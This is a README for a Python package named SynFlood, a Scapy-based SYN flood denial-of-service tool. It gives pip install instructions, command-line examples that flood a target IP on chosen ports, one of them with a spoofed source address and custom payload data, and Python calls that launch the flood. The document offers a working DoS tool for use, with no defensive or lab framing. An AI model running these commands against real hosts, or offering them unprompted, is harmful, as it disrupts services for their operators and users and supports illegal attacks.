# SynFlood

## Description
This package implement a DOS (Denial Of Service) tool in python (SYN Flood).

## Requirements
This package require : 
 - python3
 - python3 Standard Library
 - Scapy

## Installation
```bash
pip install SynFlood 
```

## Examples

### Command lines
```bash
SynFlood -h
SynFlood --dport 445 192.168.1.2
SynFlood --dport 80 --source 192.168.1.3 --sport 53545 --data "SYN FLOOD" 192.168.1.2
```

### Python3
```python
from SynFlood import launcher, synflood
synflood() # This function raise OSError some times
launcher() # This function except OSError and stop SYN flooding on KeyboardInterrupt Error
```

## Link
[Github Page](https://github.com/mauricelambert/SynFlood)

## Licence
Licensed under the [GPL, version 3](https://www.gnu.org/licenses/).
